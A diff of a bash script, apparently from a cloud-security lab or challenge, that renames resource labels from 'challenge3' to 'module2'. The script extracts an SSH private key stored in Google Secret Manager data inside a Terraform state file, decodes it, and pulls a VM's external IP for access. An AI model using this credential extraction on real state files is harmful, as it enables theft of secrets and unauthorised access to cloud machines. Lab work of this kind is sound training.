@@ -65,7 +65,7 @@ echo -e "${GREEN}✓ State file is valid JSON${NC}"
 echo -e "\n${YELLOW}[3/6] Extracting exploit components from state file...${NC}"
 
 # Find the SSH secret in the state file
-SSH_KEY_B64=$(jq -r '.resources[] | select(.type=="google_secret_manager_secret_version" and .name=="ssh-secret-version-challenge3") | .instances[0].attributes.secret_data' "$STATE_FILE" 2>/dev/null)
+SSH_KEY_B64=$(jq -r '.resources[] | select(.type=="google_secret_manager_secret_version" and .name=="ssh-secret-version-module2") | .instances[0].attributes.secret_data' "$STATE_FILE" 2>/dev/null)
 
 if [ -z "$SSH_KEY_B64" ] || [ "$SSH_KEY_B64" == "null" ]; then
     echo -e "${RED}✗ ERROR: Could not find SSH key in state file${NC}"
@@ -80,7 +80,7 @@ chmod 600 "$SSH_KEY_FILE"
 echo -e "${GREEN}✓ Decoded SSH key and saved with proper permissions${NC}"
 
 # Extract VM external IP
-VM_IP=$(jq -r '.resources[] | select(.type=="google_compute_instance" and .name=="compute-instance-challenge3") | .instances[0].attributes.network_interface[0].access_config[0].nat_ip' "$STATE_FILE" 2>/dev/null)
+VM_IP=$(jq -r '.resources[] | select(.type=="google_compute_instance" and .name=="compute-instance-module2") | .instances[0].attributes.network_interface[0].access_config[0].nat_ip' "$STATE_FILE" 2>/dev/null)
 
 if [ -z "$VM_IP" ] || [ "$VM_IP" == "null" ]; then
     echo -e "${RED}✗ ERROR: Could not find VM external IP in state file${NC}"
